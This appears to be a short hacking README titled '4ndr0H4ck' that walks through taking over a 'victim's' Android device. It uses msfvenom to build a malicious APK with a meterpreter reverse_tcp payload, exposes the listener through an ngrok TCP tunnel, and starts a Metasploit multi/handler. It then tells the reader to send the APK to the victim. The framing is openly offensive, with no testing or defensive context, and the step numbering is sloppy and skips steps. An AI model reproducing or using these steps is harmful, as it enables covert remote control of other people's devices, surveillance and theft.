4ndr0H4ck By Anonymous2309                                       
If you follow every step, you can definitely get access to your victim's android or windows device
Requirements:
<br>
<p>1.metasploit-framework</p>
<p>How to install <b>metasploit-framework</b> (if you don't have it)</p><br>
<p>1.Download Metasploit from <a href="https://metasploit.com">metasploit.com</a> or <a href="https://windows.metasploit.com/metasploitframework-latest.msi">Click here (windows users) </a>or <a href="https://apt.metasploit.com/pool/main/m/metasploit-framework/metasploit-framework_6.0.32%2B20210224103612.git.2.2d289bf~1rapid7-1_armhf.deb">Click here (linux users)</a><br>
2.Add msf to path<br>
3.Download ngrok and navigate to the folder where you downloaded it<br>
4.Start a tcp server by typing in cmd "ngrok tcp 4242"<br>
6.Open a new cmd or terminal and type the following command "<kbd>msfvenom -p android/meterpreter/reverse_tcp lhost=<ngrok lhost eg.0.tcp.ngrok.io> lport=<ngrok lport port after lhost> r> payload_name.apk</kbd>"<br>
7.Wait for the payload to be created<br>
8.6.Type "<kbd>msfconsole</kbd>"<br>
9.Wait for a few seconds<br>
10.type "<kbd>use exploit/multi/handler</kbd>"<br>
11.type "<kbd>set payload android/meterpreter/reverse_tcp</kbd>"<br>
12.type "<kbd>set lhost 0.0.0.0 (for WAN) or your_ip_addr (for LAN)<kbd><br>
13.type "<code>set lport 4242</code>"<br>
15.Hurrayy! You have successfully created a malicious apk<br>
16.Send this apk to your victim<br>
17.Type help to get all the commands and their usage.
18.Don't forget to follow me
19.<a href="https://instagram.com/programmer.launda">Follow me on Instagram</a>
